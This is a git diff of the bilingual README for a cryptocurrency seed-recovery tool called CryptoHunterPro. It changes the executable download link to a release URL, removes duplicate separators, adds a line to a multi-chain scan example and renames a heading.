@@ -103,8 +103,6 @@
 
 ---
 
----
-
 <a name="portugues-brasil"></a>
 
 # :brazil: PORTUGUÊS
@@ -202,7 +200,7 @@ Os dois módulos funcionam juntos como um pipeline completo de recuperação:
 
 ### Download Direto
 
-[Download CryptoHunterPro Windows Executables](https://github.com/henriquesmlourenco/CryptoHunterPro/raw/main/CryptoHunterPro_Windows_Executables.zip)
+[Download CryptoHunterPro Windows Executables](https://github.com/henriquesmlourenco/CryptoHunterPro/releases/download/v1.0/CryptoHunterPro_Windows_Executables.zip)
 
 1. Baixe o ZIP acima
 2. Extraia em qualquer pasta do seu computador
@@ -375,8 +373,6 @@ Este software é fornecido **apenas para propósitos legítimos de recuperação
 
 ---
 
----
-
 <a name="english"></a>
 
 # :us: ENGLISH
@@ -474,7 +470,7 @@ The two modules work together as a complete recovery pipeline:
 
 ### Direct Download
 
-[Download CryptoHunterPro Windows Executables](https://github.com/henriquesmlourenco/CryptoHunterPro/raw/main/CryptoHunterPro_Windows_Executables.zip)
+[Download CryptoHunterPro Windows Executables](https://github.com/henriquesmlourenco/CryptoHunterPro/releases/download/v1.0/CryptoHunterPro_Windows_Executables.zip)
 
 1. Download the ZIP above
 2. Extract to any folder on your computer
@@ -575,6 +571,8 @@ Valid seeds found: 3
 
 ### Example 3: CIE Multi-Chain Scan
 
+You have the seed, but you don't remember which accounts were in use.
+
 ```
 Enter seed phrase: abandon ability able about above absent absorb abstract absurd abuse access acid
 
@@ -589,7 +587,7 @@ Scanning 31 networks...
 
 ---
 
-## Derivation Paths Supported
+## Supported Networks and Paths (Derivation Paths)
 
 | Network | Format | Path |
 |---------|--------|------|
